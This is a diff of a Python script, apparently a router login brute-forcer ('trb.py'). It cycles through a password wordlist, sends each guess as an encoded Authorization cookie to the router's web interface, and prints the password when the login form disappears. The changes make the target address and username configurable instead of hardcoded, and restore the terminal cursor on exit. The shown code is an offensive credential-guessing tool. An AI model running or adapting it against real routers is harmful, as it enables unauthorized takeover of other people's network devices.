@@ -17,14 +17,14 @@ def splash():
 
 if len(sys.argv) < 2:
     splash();
-    print("\tUsage: trb.py IPRouter wordlist\n\n")
+    print("\tUsage: ./trb.py user IPRouter wordlist\n\n")
     exit(1)
 
 
 os.system('setterm -cursor off')
 
 def main():
-    wordlist = open(sys.argv[2], 'r')
+    wordlist = open(sys.argv[3], 'r')
     count = 0
     for i in wordlist:
 
@@ -36,10 +36,10 @@ def main():
 
         cookie = {"Authorization": authEncode}
 
-        response = r.get("http://192.168.0.1", cookies=cookie)
+        response = r.get('http://'+sys.argv[2], cookies=cookie)
 
         if response.content.count('id="userName"') != 1:
-            os.system('setterm -cursor off')
+            os.system('setterm -cursor on')
             print('\n\tPassword Found =====> ' + senha)
             exit(0)
         else:
@@ -53,5 +53,5 @@ if __name__ == "__main__":
     try:
         main();
     except KeyboardInterrupt:
-        os.system('setterm -cursor off')
+        os.system('setterm -cursor on')
         print("\nOperation canceled ! :(\n")
